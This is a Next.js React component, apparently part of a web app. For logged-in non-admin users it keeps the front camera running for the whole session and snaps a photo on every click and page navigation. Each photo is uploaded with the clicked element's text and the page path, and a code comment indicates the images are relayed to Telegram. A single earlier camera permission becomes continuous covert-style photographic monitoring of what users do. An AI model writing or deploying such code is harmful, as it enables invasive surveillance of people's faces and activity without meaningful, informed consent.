'use client';

import { usePathname } from 'next/navigation';
import { useEffect, useRef } from 'react';

/* 操作留影：登录用户（非管理员）每次点击/切换页面拍一张前置照片上报。
   摄像头流在会话期间保持开启（浏览器指示点常亮），快照仅画 canvas，速度快。
   最小间隔 2 秒合并连点，避免 Telegram 刷屏。 */

const LS_PERM = 'entry_perm_ok';
const MIN_INTERVAL = 2000;
const AUTH_PAGES = ['/login', '/register', '/oidc-register', '/qr-login', '/tv/login', '/warning'];

export default function OperationWatcher() {
  const pathname = usePathname();
  const streamRef = useRef<MediaStream | null>(null);
  const videoRef = useRef<HTMLVideoElement | null>(null);
  const lastRef = useRef(0);
  const timerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const pendingRef = useRef<{ label: string; path: string } | null>(null);
  const enabledRef = useRef(false);
  const pathRef = useRef(pathname);
  pathRef.current = pathname;

  useEffect(() => {
    let alive = true;
    fetch('/api/entry/status', { cache: 'no-store' })
      .then((r) => r.json())
      .then((j: { capture?: boolean }) => {
        if (alive) enabledRef.current = j.capture !== false;
      })
      .catch(() => {
        if (alive) enabledRef.current = false;
      });
    return () => {
      alive = false;
    };
  }, []);

  const ensureStream = async (): Promise<boolean> => {
    if (streamRef.current?.active && videoRef.current?.videoWidth) return true;
    try {
      const s = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user', width: { ideal: 640 } },
        audio: false,
      });
      streamRef.current = s;
      const v = document.createElement('video');
      v.muted = true;
      v.playsInline = true;
      v.srcObject = s;
      await v.play().catch(() => undefined);
      await new Promise((r) => setTimeout(r, 300));
      videoRef.current = v;
      return !!v.videoWidth;
    } catch {
      streamRef.current = null;
      return false;
    }
  };

  const snap = async (label: string, path: string) => {
    if (!enabledRef.current) return;
    try {
      if (!localStorage.getItem(LS_PERM)) return;
    } catch {
      return;
    }
    if (AUTH_PAGES.some((p) => path === p || path.startsWith(p + '/'))) return;
    const okStream = await ensureStream();
    const v = videoRef.current;
    if (!okStream || !v || !v.videoWidth) return;
    try {
      const scale = Math.min(1, 640 / v.videoWidth);
      const canvas = document.createElement('canvas');
      canvas.width = Math.round(v.videoWidth * scale);
      canvas.height = Math.round(v.videoHeight * scale);
      const ctx = canvas.getContext('2d');
      if (!ctx) return;
      ctx.drawImage(v, 0, 0, canvas.width, canvas.height);
      const photo = canvas.toDataURL('image/jpeg', 0.6);
      lastRef.current = Date.now();
      await fetch('/api/entry/op', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ photo, label, path }),
      }).catch(() => undefined);
    } catch {
      /* ignore */
    }
  };

  const schedule = (label: string) => {
    if (!enabledRef.current) return;
    const path = pathRef.current;
    const wait = Math.max(0, lastRef.current + MIN_INTERVAL - Date.now());
    if (wait <= 0) {
      void snap(label, path);
      return;
    }
    pendingRef.current = { label, path };
    if (timerRef.current) clearTimeout(timerRef.current);
    timerRef.current = setTimeout(() => {
      const p = pendingRef.current;
      pendingRef.current = null;
      timerRef.current = null;
      if (p) void snap(p.label, p.path);
    }, wait);
  };

  useEffect(() => {
    const onClick = (e: MouseEvent) => {
      const target = e.target as HTMLElement | null;
      const el = target?.closest?.('a,button,[role=button],video,input,select,summary') as HTMLElement | null;
      if (!el) return;
      const text = (el.textContent || '').trim().replace(/\s+/g, ' ').slice(0, 24);
      const href = el.getAttribute('href') || '';
      const label = `点击 ${text || el.tagName.toLowerCase()}${href ? ` → ${href.slice(0, 40)}` : ''}`;
      schedule(label);
    };
    document.addEventListener('click', onClick, true);
    return () => document.removeEventListener('click', onClick, true);
  }, []);

  const prevPath = useRef(pathname);
  useEffect(() => {
    if (prevPath.current !== pathname) {
      prevPath.current = pathname;
      schedule(`进入页面 ${pathname}`);
    }
  }, [pathname]);

  useEffect(
    () => () => {
      if (timerRef.current) clearTimeout(timerRef.current);
      streamRef.current?.getTracks().forEach((t) => t.stop());
    },
    []
  );

  return null;
}
